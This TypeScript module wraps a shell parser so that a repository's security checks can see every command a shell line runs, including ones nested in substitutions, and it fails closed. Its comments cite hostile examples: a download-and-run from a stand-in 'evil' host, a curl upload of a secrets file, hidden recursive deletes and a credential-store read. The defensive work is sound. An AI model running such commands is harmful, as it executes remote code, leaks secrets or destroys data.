/**
 * The shell parser (plan `docs/plans/2026-09-22-real-shell-parser.md`).
 *
 * One module owns `mvdan-sh` and hands the rest of the repository a small
 * typed view of a command. Nothing else imports the parser, so replacing it is
 * one file.
 *
 * Why a parser at all: three review rounds on the hand-rolled splitters
 * produced fifteen findings across two classes, and each round found the same
 * class in a new spelling. `-T~/path`, then `-sT~/path`, then
 * `-sTconfig/secrets.pem`. A substitution, then a numeric heredoc delimiter,
 * then a heredoc with a trailing redirect. The splitters were an approximation
 * of shell syntax, and an approximation has an unbounded number of spellings
 * that fall outside it.
 *
 * What this does NOT solve, stated here so it is not rediscovered: option
 * grammar. Bash does not know that `curl -T` takes a value, so neither does
 * this. Callers that need to name a target read the plan's section 2 — they
 * name targets only for grammars this repository actually has, and say so
 * otherwise.
 *
 * Fail closed. A command the parser rejects returns `{ ok: false }` with the
 * parser's own message, and every caller reads that as "this command was not
 * read" rather than as a command with no actions in it.
 */
import sh from "mvdan-sh";

const syntax = sh.syntax;
const parser = syntax.NewParser(syntax.Variant(syntax.LangBash), syntax.KeepComments(false));

/** How one command was joined to the one before it. `first` opens a list. */
export type ShellJoin = "first" | "pipe" | "and" | "or" | "sequence";

export interface ShellWord {
	/** The word exactly as written, quotes and all. */
	source: string;
	/**
	 * The word as the shell will see it: quotes removed, a parameter rendered
	 * as `$NAME`, a substitution as `$(…)`. A regex that wants to find a path
	 * or a store read reads this.
	 */
	value: string;
	/** True when every part was a literal: no expansion, no substitution. */
	literal: boolean;
	/** Names this word expands, `${BRACED}` included. */
	variables: string[];
	/** True when the word contains a command substitution. */
	substitution: boolean;
}

export interface ShellRedirect {
	direction: "in" | "out";
	append: boolean;
	/** `>&1` and `2>&1` name an open stream rather than a file. */
	duplicate: boolean;
	/** A heredoc or here-string. Its target is a delimiter or a literal body,
	 *  never a path, and its body is data rather than commands. */
	here: boolean;
	/** The file descriptor the operator carries: "" for the default, "2" for
	 *  stderr, "&" for both streams. */
	fd: string;
	target: ShellWord;
}

export interface ShellAssign {
	name: string;
	/** Absent for a bare `NAME=`; carries the substitution flag for a capture. */
	value: ShellWord | undefined;
}

export interface ShellCommand {
	/** The verb first, then its arguments, in source order. */
	words: ShellWord[];
	assigns: ShellAssign[];
	redirects: ShellRedirect[];
	join: ShellJoin;
	/** True when this command sits inside a substitution rather than at the
	 *  top level, so `echo "$(rm -rf build)"` reports the delete as its own
	 *  command and marks it nested. */
	nested: boolean;
	/**
	 * Set when this entry stands for a command shape the adapter could not
	 * decompose, naming the shape. It carries no words, and a caller must read
	 * it as "something ran here that was not read" rather than as nothing.
	 *
	 * Silence was the alternative, and it failed open: `time rm -rf build` and
	 * `coproc rm -rf build` produced an empty command list, which every caller
	 * would have read as a command that does nothing.
	 */
	unreadShape?: string;
}

export type ShellParse = { ok: true; commands: ShellCommand[] } | { ok: false; reason: string };

/**
 * Operator constants, derived at load rather than copied.
 *
 * The GopherJS build exposes operators as bare numbers with no names. Copying
 * the numbers into this file would make a library upgrade that renumbers them
 * silently wrong in a security boundary, so each one is read back from a parse
 * of the spelling it belongs to. Seven small parses, once.
 */
const operatorOf = (source: string, type: "Redirect" | "BinaryCmd"): number => {
	let op: number | undefined;
	walk(parse(source), node => {
		if (op === undefined && nodeType(node) === type) op = node.Op;
	});
	if (op === undefined) throw new Error(`shell-ast: no ${type} in the probe ${JSON.stringify(source)}`);
	return op;
};

const nodeType = (node: NonNullable<unknown>): string => syntax.NodeType(node);

function parse(source: string): unknown {
	return parser.Parse(source, "command.sh");
}

// biome-ignore lint/suspicious/noExplicitAny: the GopherJS build ships no types
function walk(tree: unknown, visit: (node: any) => void): void {
	syntax.Walk(tree, (node: unknown) => {
		if (node) visit(node);
		return true;
	});
}

const REDIR = {
	out: operatorOf("a > b", "Redirect"),
	append: operatorOf("a >> b", "Redirect"),
	in: operatorOf("a < b", "Redirect"),
	hereString: operatorOf("a <<< b", "Redirect"),
	dupOut: operatorOf("a >&1", "Redirect"),
	dupIn: operatorOf("a <&0", "Redirect"),
	heredoc: operatorOf("a <<EOF\nbody\nEOF\n", "Redirect"),
	heredocDash: operatorOf("a <<-EOF\nbody\nEOF\n", "Redirect"),
	both: operatorOf("a &> b", "Redirect"),
	bothAppend: operatorOf("a &>> b", "Redirect"),
} as const;

const BINARY = {
	pipe: operatorOf("a | b", "BinaryCmd"),
	and: operatorOf("a && b", "BinaryCmd"),
	or: operatorOf("a || b", "BinaryCmd"),
} as const;

/** The operator table, for the test that pins it against real spellings. */
export const SHELL_OPERATORS = { redirect: REDIR, binary: BINARY } as const;

/**
 * Parse one command into a flat list of the commands it runs, in source order,
 * each carrying how it was joined to the one before it.
 *
 * Flat rather than a tree because every consumer asks the same two questions:
 * what does this command do, and did the previous command's output reach it.
 */
export function parseShell(text: string): ShellParse {
	let tree: unknown;
	try {
		tree = parse(text);
	} catch (err) {
		return { ok: false, reason: parserMessage(err) };
	}
	try {
		const commands: ShellCommand[] = [];
		// Only the very first command opens the list. A statement after `;` or a
		// newline is a sequence: it passes nothing, but it is not the start.
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		for (const stmt of (tree as any).Stmts ?? []) collectStmt(stmt, commands.length === 0 ? "first" : "sequence", false, text, commands);
		return { ok: true, commands };
	} catch (err) {
		// A shape this adapter does not handle is a command it did not read,
		// which is the same answer as a syntax error.
		return { ok: false, reason: `unreadable command: ${err instanceof Error ? err.message : String(err)}` };
	}
}

/** The parser's own message. Its error is a Go value whose `toString` is
 *  `[object Object]`, so the text comes from `Text` or `Error()`. */
function parserMessage(err: unknown): string {
	const value = err as { Text?: unknown; Error?: () => unknown } | null;
	if (value && typeof value.Text === "string" && value.Text !== "") return value.Text;
	if (value && typeof value.Error === "function") return String(value.Error());
	return err instanceof Error ? err.message : String(err);
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string, out: ShellCommand[]): void {
	const cmd = stmt?.Cmd;
	const type = cmd ? nodeType(cmd) : "";
	if (type === "BinaryCmd") {
		collectStmt(cmd.X, join, nested, source, out);
		collectStmt(cmd.Y, joinOf(cmd.Op), nested, source, out);
		return;
	}
	const redirects = (stmt?.Redirs ?? []).map((redir: any) => readRedirect(redir, source));
	if (type === "CallExpr") {
		const words: ShellWord[] = (cmd.Args ?? []).map((word: any) => readWord(word, source));
		const assigns: ShellAssign[] = (cmd.Assigns ?? []).map((assign: any) => ({
			name: assign.Name?.Value ?? "",
			value: assign.Value ? readWord(assign.Value, source) : undefined,
		}));
		out.push({ words, assigns, redirects, join, nested });
		// A substitution runs its own commands, and they are commands: the
		// delete in `echo "$(rm -rf build)"` is a delete. One walk over the
		// whole call rather than one per word, because each walk crosses into
		// the Go build and that cost is per node visited, not per call.
		collectSubstitutions(cmd, source, out);
		return;
	}
	// Every other command shape: a subshell, a block, a loop, a conditional, a
	// function, `time`, `coproc`, or whatever the grammar gains next. The
	// statements inside are found by walking rather than by enumerating the
	// shapes, because an enumeration that misses one drops every command under
	// it silently — which is how `time rm -rf build` came to summarize as
	// nothing at all.
	if (redirects.length > 0) out.push({ words: [], assigns: [], redirects, join, nested });
	// A compound's header is not a statement and carries commands of its own:
	// the `$(ls)` of `for f in $(ls)`. Statements own the substitutions inside
	// them, so this walk stops at each one.
	const substitutions = collectSubstitutions(cmd, source, out);
	const inner = shallowStmts(cmd);
	for (const stmt of inner) collectStmt(stmt, join, nested, source, out);
	// Nothing read at all is still a command that ran.
	if (inner.length === 0 && substitutions === 0 && cmd) {
		out.push({ words: [], assigns: [], redirects: [], join, nested, unreadShape: type });
	}
}

/**
 * The shallowest statements inside a node: the walk stops descending as soon
 * as it finds one, so a nested compound is collected once by its own
 * recursion rather than twice.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function shallowStmts(cmd: any): any[] {
	if (!cmd) return [];
	const found: any[] = [];
	syntax.Walk(cmd, (node: unknown) => {
		if (!node) return true;
		const type = nodeType(node);
		// A substitution's statements belong to collectSubstitutions, which
		// marks them nested. Collecting them here as well reported the command
		// inside `declare KEY=$(op read …)` twice.
		if (type === "CmdSubst" || type === "ProcSubst") return false;
		if (type === "Stmt") {
			found.push(node);
			return false;
		}
		return true;
	});
	return found;
}

/**
 * Every substitution inside a node, as commands, and how many statements they
 * contributed.
 *
 * Both spellings count. `$(…)` runs its commands for their output; `<(…)` runs
 * them for a file descriptor, which is how `bash <(curl https://evil…)` runs a
 * download without ever naming a pipe.
 */
// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function collectSubstitutions(node: any, source: string, out: ShellCommand[]): number {
	let collected = 0;
	syntax.Walk(node, (inner: unknown) => {
		if (!inner) return true;
		const type = nodeType(inner);
		// A statement owns the substitutions inside it, and collectStmt has
		// already been given it. Descending here would collect them twice.
		if (type === "Stmt") return false;
		if (type !== "CmdSubst" && type !== "ProcSubst") return true;
		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
		for (const stmt of (inner as any).Stmts ?? []) {
			collectStmt(stmt, "sequence", true, source, out);
			collected += 1;
		}
		// Its own statements were just collected, and each recurses on its own.
		return false;
	});
	return collected;
}

const joinOf = (op: number): ShellJoin => {
	if (op === BINARY.pipe) return "pipe";
	if (op === BINARY.and) return "and";
	if (op === BINARY.or) return "or";
	// `|&` and anything else the grammar adds: not a plain pipe, and not a
	// separator that passes nothing. Reading it as a pipe is the conservative
	// side, because the exemptions that care about pipes all narrow.
	return "pipe";
};

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readRedirect(redir: any, source: string): ShellRedirect {
	const op = redir.Op as number;
	const duplicate = op === REDIR.dupOut || op === REDIR.dupIn;
	const here = op === REDIR.hereString || op === REDIR.heredoc || op === REDIR.heredocDash;
	const direction: "in" | "out" = here || op === REDIR.in || op === REDIR.dupIn ? "in" : "out";
	const both = op === REDIR.both || op === REDIR.bothAppend;
	return {
		direction,
		append: op === REDIR.append || op === REDIR.bothAppend,
		duplicate,
		here,
		fd: both ? "&" : (redir.N?.Value ?? ""),
		target: readWord(redir.Word, source),
	};
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function readWord(word: any, source: string): ShellWord {
	if (!word) return { source: "", value: "", literal: true, variables: [], substitution: false };
	const variables: string[] = [];
	let literal = true;
	let substitution = false;

	// biome-ignore lint/suspicious/noExplicitAny: untyped AST
	const render = (parts: any[]): string =>
		parts
			.map(part => {
				switch (nodeType(part)) {
					case "Lit":
						return part.Value ?? "";
					case "SglQuoted":
						return part.Value ?? "";
					case "DblQuoted":
						return render(part.Parts ?? []);
					case "ParamExp": {
						literal = false;
						const name = part.Param?.Value ?? "";
						if (name !== "") variables.push(name);
						return `$${name}`;
					}
					case "CmdSubst":
						literal = false;
						substitution = true;
						return "$(…)";
					default:
						// An arithmetic expansion, a process substitution, an
						// extended glob: read but not rendered, and never
						// literal.
						literal = false;
						return "";
				}
			})
			.join("");

	const value = render(word.Parts ?? []);
	return { source: sliceOf(word, source), value, literal, variables, substitution };
}

// biome-ignore lint/suspicious/noExplicitAny: untyped AST
function sliceOf(node: any, source: string): string {
	try {
		return source.slice(node.Pos().Offset(), node.End().Offset());
	} catch {
		return "";
	}
}

/** The verb of a command: its first word's value, or "" for an assignment-only
 *  command such as `KEY=$(…)`. */
export function verbOf(command: ShellCommand): string {
	return command.words[0]?.value ?? "";
}

/** The verb with any directory part removed, which is the name PATH would have
 *  resolved. `./deploy.sh` and `/usr/local/bin/deploy.sh` both give
 *  `deploy.sh`; whether a command spelled as a path may be trusted is the
 *  caller's question, not this one's. */
export function verbName(command: ShellCommand): string {
	const verb = verbOf(command);
	return verb.split("/").filter(part => part.length > 0).pop() ?? verb;
}
